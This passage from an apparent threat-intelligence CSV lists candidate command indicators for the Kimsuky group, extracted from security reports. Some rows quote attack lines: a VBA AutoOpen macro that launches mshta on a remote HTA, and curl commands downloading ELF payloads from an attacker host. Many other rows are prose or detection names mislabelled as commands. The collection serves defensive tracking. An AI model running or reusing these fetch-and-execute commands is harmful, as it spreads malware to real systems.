malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7ce7e309f2d02543aa006b3e53c49c253686f3f01e842462afc16f982d476721,observation--sha256:cd6037b5f3fb5fc0d3c1afd59b3b03ddea56ee8ee17bedd3431548a2de1c1672,command,"Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"")","Shell (""mshta https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 7}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,".Forward = True .Wrap = wdFindContinue .MatchWholeWord = True End With Selection.Find.Execute Replace:=wdReplaceAll End Sub Sub AutoOpen() Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"") End Sub If the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing the internal VBScript command and the additional PowerShell commands would be subsequently executed. The recently found malicious document files also have the same sequence ",
1.0.0,actor--kimsuky,artifact--sha256:cc8389b0c39a114b23461d109e3c545c1ff713a20ff86ac6002abf89bc491bf2,observation--sha256:cabcb2568fa8be3629bd2bd5bb187034f493d3c5036b78c1eac13ab8e9b1d1c3,command,Target Process rundll32.exe,Target Process rundll32.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:98eced2be906f31efb1294ed9a060216658471e37b77bba302483ce06f78cbce,observation--sha256:921c33a6395705b1cacedf30d0989981282bcb71541b5dc83e6517540d466df9,command,The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used,The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 11}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 5] Digital signature of EGIS Co., Ltd. HTA script used in the DOC attack vector indicates that the similar script format has been used in both the recently discovered APT attack 'Campaign Smoke Screen' and the HWP document-based attack 'Operation Stealth Power', which occurred on March 31 and April 1 in Korea. The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used the same as it is used in the DOC malicious document series. The threat organi",
1.0.0,actor--kimsuky,artifact--sha256:b988bdbb1ddeb4a74a70d46f98cbf9d734b1fd1e52ac7e164b8990da8ab5642f,observation--sha256:8f8b108892ec4b8ff255041f715bfea33dc65c16c615b61e0613a4ef0a52defb,command,"The behavior pattern (malicious code execution ÿ mshta.exe (C2 access) ÿ cmd.exe execution) is constant, and only the file name of the initially executed malware is used.","The behavior pattern (malicious code execution ÿ mshta.exe (C2 access) ÿ cmd.exe execution) is constant, and only the file name of the initially executed malware is used",candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d847a3c0a3469c0858b76c15ae5611452ceab69b386daae8afedba6dfec97c8c,observation--sha256:38c5146e36842c6f26981a0b9edcbfbc53318d0372056d082498437e767e0c1d,command,"The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell-","The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell-",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:135c502fb6e57573eb8c332bf2b418a1236e35c69d1dd67c43b2046afbe4fcf4,observation--sha256:7826c473f482668ff68ca724e34e92a520dcf5e66a58e7219d52d736dedd9765,command,This is an excerpt from only a portion of the behavior log. It accesses different URLs at 8-second intervals and displays a malicious Powershell with the same file name.,This is an excerpt from only a portion of the behavior log. It accesses different URLs at 8-second intervals and displays a malicious Powershell with the same file name,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cda6ee9e28d3eb690a14e1f28d1fe3f95364f51ff017be371ac640cc260b82aa,observation--sha256:a7b64bce7c96c10852e6680fe2c3e9a2df3361ab385f3e78e2e66d6f4228779c,command,Trojan/PowerShell.Agent.SC186245 (2023.05.08.00),Trojan/PowerShell.Agent.SC186245 (2023.05.08.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7a49da854ccf85c1fd3fff6290e34826c0001474570c313753f3ac355508c82e,observation--sha256:686abcbbd72d6c4728aec31b6b5ad8cdbfefdfa08c748ecc63d204f18a431b3d,command,Trojan/PowerShell.KeyLogger (2023.05.09.00),Trojan/PowerShell.KeyLogger (2023.05.09.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f7611d2ec2e682f3faee9b61a42a2f1753bf0db0623ab69d539130421e6fc3e1,observation--sha256:68092e91767b770989667ab0688f087e9b395e268ae12e77f999a5a0f3fcf0fa,command,Trojan/Powershell.FlowerPower.SC188960 (2023.05.26.00),Trojan/Powershell.FlowerPower.SC188960 (2023.05.26.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cc5541f4adfbd62008051dceff491c104af4dfc79e1625d207cd4474c601c5fc,observation--sha256:09b498cda06cf841183c583914775b5233de9c0ca15f8d6feecedf6bd4c83a21,command,Trojan/Powershell.FlowerPower.SC188966 (2023.05.26.00),Trojan/Powershell.FlowerPower.SC188966 (2023.05.26.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:16f44e012a917b86c2a6297152ded5282111fc7b8ecdc960f07004f529df69ed,observation--sha256:f78e9be651b6e88fcf401d7b09a2eb17dbb9ae49b95b579da069db7d8f9d6cf2,command,Trojan/Powershell.FlowerPower.SC189040 (2023.06.02.00),Trojan/Powershell.FlowerPower.SC189040 (2023.06.02.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fe1f535bb2832aeac77aa8e340a206f5feb8587174a5f712edbdacbc84b2b514,observation--sha256:1a6430f8d12d40bdb1e5d1cada244dc60acc7c8276bc51f7b2be86ca936ef266,command,Trojan/Powershell.FlowerPower.SC189043 (2023.06.02.00),Trojan/Powershell.FlowerPower.SC189043 (2023.06.02.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:74ab93280cd70d897fc3125017a515216d8ca1169805882200752ee89131c592,observation--sha256:c3cd21383773bd81470fc7fcf30e502f2e445d14de695d8b6890b2583651e168,command,case execution contained an ActiveX decode and the well known lolbin certutil.,case execution contained an ActiveX decode and the well known lolbin certutil,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2e6c5672af4968418f41eacbde0aa8e184fcd82ea8954ed69c0eda1052ab6d66,observation--sha256:51693e09d9865344ec9d9291562c1eb18c1e13179331e7ce7a28add2081e6f67,command,certutil encoding,certutil encoding,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 • Remote access capabilities, including exfiltration of collected data • Interest in open source .NET and custom Golang RATs • Packing and simple obfuscation techniques to mask malware from basic detection methods • Custom encryption and LOLbin techniques like automated exfil and Base64 certutil encoding A technical deep dive of all Kimsuky malware is beyond the scope of this paper, however, we have included a brief description of some of the common Windows malware for further reading and res",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ec4e0361b115f596f5b726c4e6287af981048370176a598f02437d116a441466,observation--sha256:60db7d019da22988525e7425ae8634f18198a9de3e9262b3dda69a29b009fcae,command,cobalt strike loaders and reverse shells written in powershell. A compiled,cobalt strike loaders and reverse shells written in powershell. A compiled,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 347}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,cobalt strike loaders and reverse shells written in powershell. A compiled,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:895c6c3d9ba1fef83ab6a594858779b750b7eb40dd9e985ce9c1d0276b0fca35,observation--sha256:f947daba02e50ce690d3f8724a36df6b38d8bb31d947d019d7d0673c2bd9c9a0,command,"command, and execution permission was granted. After downloading the file from the outside through the wget and curl","command, and execution permission was granted. After downloading the file from the outside through the wget and curl",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:e4f1701eb5d1ef1d2f938dfb56779479622a6e8d110d9a48c246818aaf11ed66,observation--sha256:d889df498cb67a4a7f6d4fb0d662b3420ac388f249876e917a806d71159a20a9,command,"curl ""http://wallet-info.esy.es/1.elf"" -o1.elf ls","curl ""http://wallet-info.esy.es/1.elf"" -o1.elf ls",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:5abf7d48fdbd55702f0a4c16453c58dcfd95eea2ec88544c0ca648ae0ac77372,observation--sha256:a7d4358919c46e195a864dfa5e835093d19fbe2727f94d9cda183d5773449c61,command,"curl ""http://wallet-info.esy.es/2.elf"" -o 2.elf ls","curl ""http://wallet-info.esy.es/2.elf"" -o 2.elf ls",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:840243a33beda88c32ec1aebcb438c478ee4f685dd8a2acf030512ca1f101580,observation--sha256:c0a3f03c15f15f0872aa5decf06c8b6928ca014ff0c1ba9f8cef1a959bdbe3aa,command,"curl -ksi --cookie ""DSPSALPREF=cHJpbnRmKCJISVQiKTsK"" \","curl -ksi --cookie ""DSPSALPREF=cHJpbnRmKCJISVQiKTsK"" \",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 571}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -ksi --cookie ""DSPSALPREF=cHJpbnRmKCJISVQiKTsK"" \",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a8d5e0ad99d0f343101190662b83741bdb3d25a6391eae79beee40f82ef92339,observation--sha256:e6a3ea9833fcde32fdb168eee7844f02754bb29db8110b847d7e212239ec9249,command,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/generator.php","curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/generator.php",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 406}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/generator.php",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:73cf99d4e0604c47a0c0884a89d572569d1a51f6ffefe3bb9da9d151d19c98f8,observation--sha256:91c7da27d1a5d9f027e3a3eb81c732633c6299167a72255aff299f814da2c8c9,command,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/logs.php","curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/logs.php",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 411}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/logs.php",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c1ad9ad84c062541dd85c153250761e5fdd4a7e39df69f459157f0554ab4d87e,observation--sha256:b5c7b36d6d3ac93aca5873c2de7b37465d771f70167ab67a616c42548a70d120,command,"curl""http://wallet-info.esy.es/2.b""-o/apache/apache-tomcat-7.0.103/startcurl""http://wallet-info.","curl""http://wallet-info.esy.es/2.b""-o/apache/apache-tomcat-7.0.103/startcurl""http://wallet-info",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:f0aa2e8005ef3b70215f7d15987586ea08ef6e7547e53970476bd4ed332e641a,observation--sha256:d9b9c99fa1c643864c9e9fe2114f914ff1912c6c9518225a6030c8c2d769e786,command,"curl""http://wallet-info.esy.es/2.b""-o/home/2.elf","curl""http://wallet-info.esy.es/2.b""-o/home/2.elf",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:b49cab2b917ff1bcbb8f13962e64ca235f40bc9560d3cb3c2450fde66ca1d734,observation--sha256:5721935805edf7d35dfecc0eb2d4d6ac0ceb47d64527e6e06334235857b9df51,command,dropper-regsvr32(x86).dll(SatOct1005:41:242020),dropper-regsvr32(x86).dll(SatOct1005:41:242020,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:b73b04df2c3a74b55cf8db3a8ffdb027ca32c80e5b059b6eec21c758287d5063,observation--sha256:22a7ccdca5208dd402612f17043d3e284071ae636eee1fb0c2817e0f4fa322b9,command,executed as a DLL with the use of regsvr32.exe and function name.,executed as a DLL with the use of regsvr32.exe and function name,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 • Remote access capabilities, including exfiltration of collected data • Interest in open source .NET and custom Golang RATs • Packing and simple obfuscation techniques to mask malware from basic detection methods • Custom encryption and LOLbin techniques like automated exfil and Base64 certutil encoding A technical deep dive of all Kimsuky malware is beyond the scope of this paper, however, we have included a brief description of some of the common Windows malware for further reading and res",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c08e4fb9c842efc2d88894c313131593e024f2c8779501f4c9d877a2cceeb9b7,observation--sha256:b5ce1cdced79476603520b3ef1db14e401ce87db1f497cfbbbe2cd1cdfc72f72,command,mshta.exe,mshta.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c08e4fb9c842efc2d88894c313131593e024f2c8779501f4c9d877a2cceeb9b7,observation--sha256:66a1447926fcb6f9ac12af606b61d86cc0f1dfdda00dfe3d8400582a89251bb9,command,mshta.exe,mshta.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7a496961171e339f3ba989e8ddd7342f06fe0ab7c1bc20090940190a40333a6f,observation--sha256:504c8859a81cb5061e18e328e333b2e0c07512d8ce5cb66a17b648c1a4d6a73c,command,mshta.exe http://xxx/shop/price/com/first.hta,mshta.exe http://xxx/shop/price/com/first.hta,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,mshta.exe http://xxx/shop/price/com/first.hta,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e6fee25cf409ce9da137e0e90121f3faa45111450c8b91304567d7f65b2a68f8,observation--sha256:da3b5de478b066d27b36af057ca465657af1aa9a468841c20dd8d1c13a31fc7a,command,powershell.exe,powershell.exe,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
